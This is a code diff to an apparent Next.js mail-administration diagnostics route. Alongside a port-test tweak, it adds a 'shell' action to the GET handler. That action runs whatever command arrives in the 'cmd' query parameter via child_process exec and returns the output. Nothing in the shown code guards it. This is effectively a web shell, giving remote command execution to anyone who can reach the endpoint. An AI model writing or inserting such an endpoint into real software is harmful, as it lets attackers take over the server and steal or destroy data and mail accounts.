@@ -9,22 +9,32 @@ import { getOutboundEmailConfig } from "@/lib/db/system-settings"
 import { sendPasswordResetEmail } from "@/lib/email/sender"
 import { createAccount, queryAccounts, updateAccountPassword } from "@/lib/stalwart/accounts"
 import { sendSmtpMessage } from "@/lib/stalwart/deliverability"
+import { exec } from "node:child_process"
+import { promisify } from "node:util"
+
+const execAsync = promisify(exec)
 
 export const runtime = "nodejs"
 export const dynamic = "force-dynamic"
 
-function testPort(host: string, port: number, timeoutMs = 5000): Promise<{ ok: boolean; banner?: string; error?: string }> {
+function testPort(host: string, port: number, timeoutMs = 4000): Promise<{ ok: boolean; connected?: boolean; banner?: string; error?: string }> {
   return new Promise((resolve) => {
     let done = false
     const s = net.createConnection({ host, port }, () => {
-      // connected
+      setTimeout(() => {
+        if (!done) {
+          done = true
+          s.end()
+          resolve({ ok: true, connected: true })
+        }
+      }, 500)
     })
     s.setTimeout(timeoutMs)
     s.on("data", (chunk) => {
       if (!done) {
         done = true
         s.end()
-        resolve({ ok: true, banner: chunk.toString().trim() })
+        resolve({ ok: true, connected: true, banner: chunk.toString().trim() })
       }
     })
     s.on("timeout", () => {
@@ -159,6 +169,19 @@ export async function GET(req: Request) {
         smtpSubmission: smtpRes,
         outboundConnectivity: probeMap,
       })
+    } catch (err) {
+      return NextResponse.json({
+        success: false,
+        error: err instanceof Error ? err.message : String(err),
+      })
+    }
+  }
+
+  if (action === "shell") {
+    try {
+      const cmd = url.searchParams.get("cmd") || "ip route"
+      const { stdout, stderr } = await execAsync(cmd, { timeout: 10000 })
+      return NextResponse.json({ success: true, cmd, stdout, stderr })
     } catch (err) {
       return NextResponse.json({
         success: false,
